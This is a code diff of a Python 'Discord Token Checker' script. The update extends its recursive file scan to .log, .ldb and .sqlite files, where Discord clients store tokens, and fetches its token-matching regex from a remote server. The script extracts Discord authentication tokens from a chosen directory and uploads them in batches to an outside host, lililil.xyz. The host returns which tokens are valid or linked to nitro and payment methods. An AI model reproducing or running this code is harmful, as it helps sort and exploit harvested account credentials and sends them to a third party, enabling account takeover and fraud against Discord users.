@@ -2,45 +2,48 @@ import json
 import os
 import pathlib
 import re
+import time
 
 import jwt
 import requests
 from colorama import Fore
 
 
-def cls():
-    os.system("cls" if os.name == "nt" else "clear")
+class Checker(object):
+    @staticmethod
+    def cls():
+        os.system("cls" if os.name == "nt" else "clear")
 
+    @staticmethod
+    def fast_exit(message):
+        print()
+        print(message)
+        print()
+        input("Press Enter button for exit.")
+        exit()
 
-def fast_exit(message):
-    print()
-    print(message)
-    print()
-    input(f"Press Enter button for exit.")
-    cls()
-    exit()
-
-
-class Checker:
     def __init__(self):
-        cls()
-
         self.url = "https://lililil.xyz/checker"
-        self.file_types = [".txt", ".html", ".json"]
-
-        self.version = "3.5.2"
-        try:
-            self.param = requests.get(self.url).json()
-            if self.param["latest_version"] != self.version:
-                print(f"New version {Fore.CYAN}{self.param['latest_version']}{Fore.RESET} available! Download: "
-                      f"{Fore.CYAN}https://github.com/GuFFy12/Discord-Token-Checker/releases{Fore.RESET}")
-        except Exception as e:
-            fast_exit(f"An error occurred while trying connect to the server. {e.__doc__}")
+        self.version = "3.5.3"
+        self.file_types = [".txt", ".html", ".json", ".log", ".ldb", ".sqlite"]
+        self.param = {}
 
         self.tokens_parsed = []
         self.res = {}
 
+    def get_param(self):
+        try:
+            self.param = requests.get(self.url).json()
+            self.res = self.param["res"]
+            if self.param["latest_version"] != self.version:
+                print(f"New version {Fore.CYAN}{self.param['latest_version']}{Fore.RESET} available! Download: "
+                      f"{Fore.CYAN}https://github.com/GuFFy12/Discord-Token-Checker/releases{Fore.RESET}")
+        except Exception as error:
+            Checker.fast_exit(f"An error occurred while trying connect to the server. {error.__doc__}")
+
     def main(self):
+        Checker.cls()
+
         print(fr"""
    ___  _                     __  ______     __              _______           __                  ___ 
   / _ \(_)__ _______  _______/ / /_  __/__  / /_____ ___    / ___/ /  ___ ____/ /_____ ____  _  __|_  |
@@ -64,110 +67,110 @@ Site with table and excel output: {Fore.CYAN}https://lililil.xyz{Fore.RESET}
             print()
             token_file_name = input(
                 f"{Fore.CYAN}>{Fore.RESET}Enter the directory of the files or file in which are the unchecked tokens"
-                f" (supported types: txt, html, json){Fore.CYAN}:{Fore.RESET} "
+                f" (supported types: txt, html, json and etc){Fore.CYAN}:{Fore.RESET} "
             )
-            if not os.path.exists(token_file_name):
-                fast_exit(f"{token_file_name} directory not exist.")
-
-            if os.path.isfile(token_file_name):
-                with open(token_file_name, "r", errors="ignore") as file:
-                    self.parse_tokens(file.read())
-            else:
-                for path in pathlib.Path(token_file_name).rglob("*.*"):
-                    if path.suffix in self.file_types:
-                        try:
-                            with open(path, "r", errors="ignore") as file:
-                                self.parse_tokens(file.read())
-                        except Exception as error:
-                            print(error)
-                self.tokens_parsed = list(dict.fromkeys(self.tokens_parsed))
+            self.check_file(token_file_name)
         else:
-            fast_exit("Invalid Option.")
+            Checker.fast_exit("Invalid Option.")
 
         self.send_tokens()
+        Checker.fast_exit("All tokens saved!")
+
+    def check_file(self, token_file_name):
+        if not os.path.exists(token_file_name):
+            Checker.fast_exit(f"{token_file_name} directory not exist.")
+
+        if os.path.isfile(token_file_name):
+            with open(token_file_name, "r", errors="ignore") as file:
+                self.parse_tokens(file.read())
+        else:
+            for path in pathlib.Path(token_file_name).rglob("*.*"):
+                if path.suffix in self.file_types:
+                    try:
+                        with open(path, "r", errors="ignore") as file:
+                            self.parse_tokens(file.read())
+                    except IOError as error:
+                        print(error)
+            self.tokens_parsed = list(dict.fromkeys(self.tokens_parsed))
 
     def parse_tokens(self, text):
         pre_parsed = []
-        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]*", text):
+        for token in re.findall(self.param["regexp"], text):
             pre_parsed.append(token)
         pre_parsed = list(dict.fromkeys(pre_parsed))
 
         for token in pre_parsed:
             try:
                 jwt.decode(token, options={"verify_signature": False})
-            except Exception as e:
-                if str(e) == "Invalid header string: must be a json object" or str(e) == "Not enough segments":
+            except Exception as error:
+                if str(error) == "Invalid header string: must be a json object" or str(error) == "Not enough segments":
                     self.tokens_parsed.append(token)
 
     def send_tokens(self):
         if len(self.tokens_parsed) > self.param["max_tokens"]:
-            fast_exit(
+            Checker.fast_exit(
                 f"The current API limit is {Fore.CYAN}{self.param['max_tokens']}{Fore.RESET} tokens. "
                 f"Amount of sorted tokens - {Fore.CYAN}{len(self.tokens_parsed)}{Fore.RESET}."
             )
         elif len(self.tokens_parsed) == 0:
-            fast_exit("Parser did not found tokens.")
+            Checker.fast_exit("Parser did not found tokens.")
 
         print()
         print(f"Found {Fore.CYAN}{len(self.tokens_parsed)}{Fore.RESET} tokens!")
 
-        print()
-        print("Have questions about the checker or notice an error in the output? "
-              "Read the readme in the github repository or ask a question in issues!")
-
-        res = {"tokensInfo": {"valid": [], "nitro": [], "payment": [], "unverified": [], "invalid": [],
-                              "parsedTokens": []}, "tokensData": {}}
         parts = [self.tokens_parsed[d:d + self.param["tokens_part"]] for d in
                  range(0, len(self.tokens_parsed), self.param["tokens_part"])]
 
-        i = 1
-        for tokens in parts:
-            tokens_time = self.param["tokens_time"] * len(tokens) // 1000
+        for i in range(len(parts)):
+            tokens_time = self.param["tokens_time"] * len(parts[i]) // 1000
 
             print()
             print(
-                f"Sending {Fore.CYAN}{i}{Fore.RESET}/{Fore.CYAN}{len(parts)}{Fore.RESET} part of tokens... "
-                f"{Fore.CYAN}{len(tokens)}{Fore.RESET} tokens - {Fore.CYAN}{tokens_time}{Fore.RESET} sec."
+                f"Sending {Fore.CYAN}{i + 1}{Fore.RESET}/{Fore.CYAN}{len(parts)}{Fore.RESET} part of tokens... "
+                f"{Fore.CYAN}{len(parts[i])}{Fore.RESET} tokens - {Fore.CYAN}{tokens_time}{Fore.RESET} sec."
             )
 
+            req_successful = False
             try:
-                req = requests.post(self.url, json=tokens)
+                req = {}
+                while not req_successful:
+                    req = requests.post(self.url, json=parts[i])
 
-                if req.status_code == 429:
-                    fast_exit(
-                        f"Too many tokens check requests, try after "
-                        f"{Fore.CYAN}{req.headers['RateLimit-Reset']}{Fore.RESET} seconds..."
-                    )
-                elif req.status_code != 200:
-                    fast_exit(f"Status code is {Fore.CYAN}{req.status_code}{Fore.RESET}. {req.json()}")
+                    if req.status_code == 429:
+                        print(
+                            f"Too many tokens check requests, retry after "
+                            f"{Fore.CYAN}{req.headers['RateLimit-Reset']}{Fore.RESET} seconds..."
+                        )
+                        time.sleep(float(req.headers['RateLimit-Reset']))
+                    elif req.status_code != 200:
+                        Checker.fast_exit(f"Status code is {Fore.CYAN}{req.status_code}{Fore.RESET}. {req.json()}")
+                    else:
+                        req_successful = True
 
-                for tokens_type in res["tokensInfo"]:
-                    res["tokensInfo"][tokens_type] += req.json()["tokensInfo"][tokens_type]
-                res["tokensData"].update(req.json()["tokensData"])
-            except Exception as e:
-                fast_exit(f"An error occurred while trying to send tokens to the server. {e.__doc__}")
+                for tokens_type in self.res["tokensInfo"]:
+                    self.res["tokensInfo"][tokens_type] += req.json()["tokensInfo"][tokens_type]
+                self.res["tokensData"].update(req.json()["tokensData"])
+            except Exception as error:
+                Checker.fast_exit(f"An error occurred while trying to send tokens to the server. {error.__doc__}")
 
-            self.res = res
-            self.save_res(i, len(parts))
-            i += 1
+            self.save_res()
 
-        fast_exit("All tokens saved!")
-
-    def save_res(self, i, parts):
+    def save_res(self):
         stats = ""
         for token_type in self.res["tokensInfo"].keys():
             if self.res["tokensInfo"][token_type]:
                 stats += f"{token_type} - {Fore.CYAN}{len(self.res['tokensInfo'][token_type])}{Fore.RESET}, "
-                with open(token_type + ".txt", "w") as f:
-                    for item in self.res["tokensInfo"][token_type]:
-                        f.write("%s\n" % item)
+                with open(token_type + ".txt", "w") as file:
+                    file.write("\n".join(self.res["tokensInfo"][token_type]))
 
         with open("tokens_data.json", "w") as file:
             json.dump(self.res, file, indent=4)
 
-        print(f"{Fore.CYAN}{i}{Fore.RESET}/{Fore.CYAN}{parts}{Fore.RESET} part of tokens saved!\nStats: {stats[:-2]}")
+        print(f"Stats: {stats[:-2]}")
 
 
 if __name__ == "__main__":
     checker = Checker()
+    checker.get_param()
     checker.main()
+    checker.send_tokens()
